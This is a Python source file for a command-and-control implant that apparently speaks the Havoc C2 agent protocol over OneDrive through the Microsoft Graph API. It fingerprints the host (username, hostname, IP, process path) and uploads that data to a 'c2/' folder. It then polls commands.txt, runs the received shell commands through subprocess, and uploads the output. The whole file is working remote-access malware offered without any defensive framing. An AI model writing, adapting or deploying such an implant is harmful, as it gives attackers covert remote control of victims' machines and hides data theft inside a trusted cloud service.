import requests
import struct
import socket
import time
import os
import sys
import base64
import random
import platform
import datetime
import subprocess
from msal import ConfidentialClientApplication
import json

# Configuration
GRAPH_API_URL = "https://graph.microsoft.com/v1.0"
CLIENT_ID = "CLIENT_ID"
CLIENT_SECRET = "CLIETNT_SECRET"
SCOPES = ["Files.Read.All", "Files.ReadWrite.All", "Files.ReadWrite.AppFolder"]
REFRESH_TOKEN = "REFRESH_TOKEN"
def log(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[AGENT][{timestamp}] {message}")
    sys.stdout.flush()

class TokenManager:
    def __init__(self):
        self.client = ConfidentialClientApplication(
            client_id=CLIENT_ID,
            client_credential=CLIENT_SECRET,
            authority="https://login.microsoftonline.com/common"
        )
        self.access_token = None
        self.refresh_token = REFRESH_TOKEN
        self.token_expiry = None
        if not self.refresh_token:
            self.fetch_initial_token()

    def fetch_initial_token(self):
        log("Fetching initial refresh token from OneDrive")
        try:
            # Use anonymous access to /c2/token.txt (assumes sharing link created by server)
            # For simplicity, we try without auth first
            url = f"{GRAPH_API_URL}/me/drive/root:/c2/token.txt:/content"
            response = requests.get(url)
            if response.status_code == 401:
                log("Authentication required; please provide refresh token manually")
                raise Exception("No refresh token available")
            if response.status_code == 200:
                token_info = json.loads(response.content)
                self.access_token = token_info.get("access_token")
                self.refresh_token = token_info.get("refresh_token")  # May not be stored
                expiry = token_info.get("expiry")
                if expiry:
                    self.token_expiry = datetime.datetime.fromtimestamp(
                        expiry / 1000, tz=datetime.timezone.utc
                    )
                log(f"Loaded initial token. Expires at {self.token_expiry.isoformat() if self.token_expiry else 'unknown'}")
            else:
                log(f"Failed to fetch token.txt: {response.status_code} {response.text}")
                raise Exception("Failed to fetch initial token")
        except Exception as e:
            log(f"Token fetch failed: {e}")
            raise Exception("Agent requires a valid refresh token")

    def get_access_token(self):
        current_time = datetime.datetime.now(datetime.timezone.utc)
        if self.access_token and self.token_expiry and self.token_expiry > current_time + datetime.timedelta(minutes=10):
            return self.access_token

        log("Refreshing access token")
        if not self.refresh_token:
            self.fetch_initial_token()

        result = self.client.acquire_token_by_refresh_token(self.refresh_token, scopes=SCOPES)
        if "access_token" not in result:
            log(f"Token refresh failed: {result.get('error_description', 'Unknown error')}")
            self.fetch_initial_token()
            return self.access_token

        self.access_token = result["access_token"]
        self.refresh_token = result.get("refresh_token", self.refresh_token)
        expires_in = result["expires_in"]
        self.token_expiry = current_time + datetime.timedelta(seconds=expires_in)
        log(f"New token expires at {self.token_expiry.isoformat()}")
        return self.access_token

def pack_int(num):
    return struct.pack(">I", num)

def pack_string(s):
    if isinstance(s, str):
        s = s.encode("utf-8")
    return pack_int(len(s)) + s

magic = b"\x41\x41\x41\x41"
agentid = random.randint(0, 0x7FFFFFFF)
sleeptime = 1000
log(f"Agent initialized: ID={agentid:08x}, Magic={magic.hex()}")

if platform.machine().endswith("64"):
    arch = 2
else:
    arch = 1
log(f"Architecture: {'x64' if arch == 2 else 'x86'}")

registered = False
outputdata = b""
is_windows = platform.system() == "Windows"
log(f"OS: {platform.system()} {'(Warning: Windows commands expected)' if not is_windows else ''}")

COMMAND_REGISTER = 0x100
COMMAND_GET_JOB = 0x101
COMMAND_NO_JOB = 0x102
COMMAND_SHELL = 0x152
COMMAND_EXIT = 0x155
COMMAND_OUTPUT = 0x200

token_manager = TokenManager()

def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def build_register_payload(agent_id):
    try:
        username = os.getlogin()
    except:
        username = "unknown"
    try:
        hostname = socket.gethostname()
    except:
        hostname = "unknown"
    ip_address = get_ip_address()
    process_path = os.path.abspath(__file__)
    process_id = os.getpid()

    payload = b""
    payload += pack_int(COMMAND_REGISTER)
    payload += pack_int(agent_id)
    payload += pack_string(username)
    payload += pack_string(hostname)
    payload += pack_string("")
    payload += pack_string(ip_address)
    payload += pack_string(process_path)
    payload += pack_int(process_id)
    payload += pack_int(0)
    payload += pack_int(arch)
    payload += pack_int(0)
    payload += pack_int(10)
    payload += pack_int(0)
    payload += pack_int(1)
    payload += pack_int(0)
    payload += pack_int(19045)
    payload += pack_int(9 if arch == 2 else 0)
    payload += pack_int(sleeptime // 1000)
    payload += pack_int(0)
    payload += pack_int(0)
    payload += pack_int(0)
    return payload

def create_folder(folder_path):
    headers = {"Authorization": f"Bearer {token_manager.get_access_token()}", "Content-Type": "application/json"}
    url = f"{GRAPH_API_URL}/me/drive/root/children"
    body = {
        "name": folder_path.split("/")[-1],
        "folder": {},
        "@microsoft.graph.conflictBehavior": "fail"
    }
    parent_path = "/".join(folder_path.split("/")[:-1])
    if parent_path:
        parent_url = f"{GRAPH_API_URL}/me/drive/root:/{parent_path}"
        response = requests.get(parent_url, headers=headers)
        if response.status_code != 200:
            create_folder(parent_path)  # Recursively create parent folders
        parent_id = response.json()["id"]
        url = f"{GRAPH_API_URL}/me/drive/items/{parent_id}/children"

    for attempt in range(3):
        try:
            response = requests.post(url, headers=headers, json=body)
            if response.status_code in [200, 201]:
                log(f"Created folder {folder_path}")
                return True
            elif response.status_code == 409:
                log(f"Folder {folder_path} already exists")
                return True
            log(f"Create folder failed: {response.status_code} {response.text}")
        except requests.RequestException as e:
            log(f"Create folder failed (attempt {attempt+1}): {e}")
        time.sleep(1)
    return False

def upload_file(path, content):
    headers = {"Authorization": f"Bearer {token_manager.get_access_token()}", "Content-Type": "application/octet-stream"}
    url = f"{GRAPH_API_URL}/me/drive/root:/{path}:/content"
    for attempt in range(3):
        try:
            response = requests.put(url, headers=headers, data=content)
            if response.status_code in [200, 201]:
                log(f"Uploaded to {path}")
                return True
            log(f"Upload failed: {response.status_code} {response.text}")
        except requests.RequestException as e:
            log(f"Upload failed (attempt {attempt+1}): {e}")
        time.sleep(1)
    return False

def download_file(path):
    headers = {"Authorization": f"Bearer {token_manager.get_access_token()}"}
    url = f"{GRAPH_API_URL}/me/drive/root:/{path}:/content"
    for attempt in range(3):
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                log(f"Downloaded {path}: len={len(response.content)}")
                return response.content
            elif response.status_code == 404:
                log(f"File {path} not found")
                return b""
            log(f"Download failed: {response.status_code} {response.text}")
        except requests.RequestException as e:
            log(f"Download failed (attempt {attempt+1}): {e}")
        time.sleep(1)
    return b""

def register():
    global registered
    log("Registering agent")
    
    # Create agent folder
    folder_path = f"c2/{agentid:08x}"
    if not create_folder(folder_path):
        log("Failed to create agent folder")
        return False

    # Send registration data
    payload = build_register_payload(agentid)
    message_size = len(payload) + 12
    agentheader = pack_int(message_size) + magic + pack_int(agentid)
    data = agentheader + payload
    encoded_data = base64.b64encode(data).decode("utf-8")

    if not upload_file(f"{folder_path}/data.txt", encoded_data.encode("utf-8")):
        log("Failed to upload registration data")
        return False

    # Poll for registration response
    timeout = time.time() + 60
    while time.time() < timeout:
        content = download_file(f"{folder_path}/commands.txt")
        if content:
            try:
                decoded_response = base64.b64decode(content)
                if len(decoded_response) == 4:
                    received_id = struct.unpack("<I", decoded_response)[0]
                    log(f"Received ID: {received_id:08x}")
                    if received_id == agentid:
                        log("Registration successful")
                        upload_file(f"{folder_path}/commands.txt", b"")  # Clear commands
                        return True
                    else:
                        log(f"ID mismatch: expected {agentid:08x}, got {received_id:08x}")
                else:
                    log(f"Invalid response length: {len(decoded_response)}")
            except (base64.binascii.Error, struct.error):
                log("Failed to decode commands.txt")
            upload_file(f"{folder_path}/commands.txt", b"")  # Clear commands
        time.sleep(1)
    log("Registration timed out")
    return False

def checkin(data):
    global outputdata
    folder_path = f"c2/{agentid:08x}"
    
    # Step 1: Send COMMAND_OUTPUT if there is output
    if data:
        log(f"Sending COMMAND_OUTPUT: len={len(data)}")
        command_id = struct.unpack(">I", data[:4])[0]
        log(f"Output command: {command_id:08x}")
        message_size = len(data) + 12
        agentheader = pack_int(message_size) + magic + pack_int(agentid)
        full_data = agentheader + data
        encoded_data = base64.b64encode(full_data).decode("utf-8")
        if not upload_file(f"{folder_path}/data.txt", encoded_data.encode("utf-8")):
            log("Failed to upload COMMAND_OUTPUT")
            return b""
        time.sleep(1)

    # Step 2: Send COMMAND_GET_JOB to request tasks
    log("Sending COMMAND_GET_JOB")
    payload = pack_int(COMMAND_GET_JOB) + pack_int(agentid)
    message_size = len(payload) + 12
    agentheader = pack_int(message_size) + magic + pack_int(agentid)
    job_data = agentheader + payload
    encoded_data = base64.b64encode(job_data).decode("utf-8")
    if not upload_file(f"{folder_path}/data.txt", encoded_data.encode("utf-8")):
        log("Failed to upload COMMAND_GET_JOB")
        return b""

    # Step 3: Wait for tasks from handler
    timeout = time.time() + 10
    taskings = b""
    while time.time() < timeout:
        content = download_file(f"{folder_path}/commands.txt")
        if content:
            try:
                taskings = base64.b64decode(content)
                log(f"Received taskings: len={len(taskings)}")
                upload_file(f"{folder_path}/commands.txt", b"")  # Clear commands
                break
            except base64.binascii.Error:
                log("Failed to decode commands.txt")
                upload_file(f"{folder_path}/commands.txt", b"")
        time.sleep(1)
    return taskings

def runcommand(command):
    log(f"Processing command: {command[:50]}...")
    try:
        command = command.strip(b"\x00").decode("utf-8")
    except UnicodeDecodeError:
        log("Invalid command encoding")
        return ""
    if command == "exit":
        log("Exit command received")
        sys.exit(0)
    if command.lower().startswith("c:\\windows\\system32\\cmd.exe /c "):
        command = command[30:].strip()
    log(f"Executing: {command}")
    try:
        shell = "cmd.exe" if is_windows else "bash"
        process = subprocess.run(command, shell=True, capture_output=True, text=True, executable=shell if not is_windows else None)
        output = process.stdout
        if process.stderr:
            output += process.stderr
    except Exception as e:
        output = f"Error: {str(e)}\n"
    log(f"Output: {output[:50]}... (len={len(output)})")
    return output

while not registered:
    log("Attempting registration")
    registered = register()
    if not registered:
        log(f"Retrying in {sleeptime / 1000}s")
        time.sleep(sleeptime / 1000)

log("Agent registered")

while True:
    commands = checkin(outputdata)
    outputdata = b""
    log(f"Commands received: len={len(commands)}")
    if commands == COMMAND_NO_JOB.to_bytes(4, "little"):
        log("No jobs")
    elif len(commands) >= 4:
        command_id = struct.unpack("<I", commands[:4])[0]
        commands = commands[4:]
        log(f"Command ID: {command_id:08x}")
        if command_id == COMMAND_SHELL:
            if len(commands) < 4:
                log("Incomplete shell command")
            else:
                str_len = struct.unpack("<I", commands[:4])[0]
                commands = commands[4:]
                if len(commands) < str_len:
                    log("Incomplete shell data")
                else:
                    command = commands[:str_len]
                    commands = commands[str_len:]
                    output = runcommand(command)
                    output_packet = pack_int(COMMAND_OUTPUT) + pack_string(output)
                    outputdata = output_packet
                    log(f"Prepared COMMAND_OUTPUT: len={len(output_packet)}")
        elif command_id == COMMAND_EXIT:
            log("Exit command")
            sys.exit(0)
        else:
            log(f"Unsupported command: {command_id:08x}")
    else:
        log("Invalid command data")
    time.sleep(sleeptime / 1000)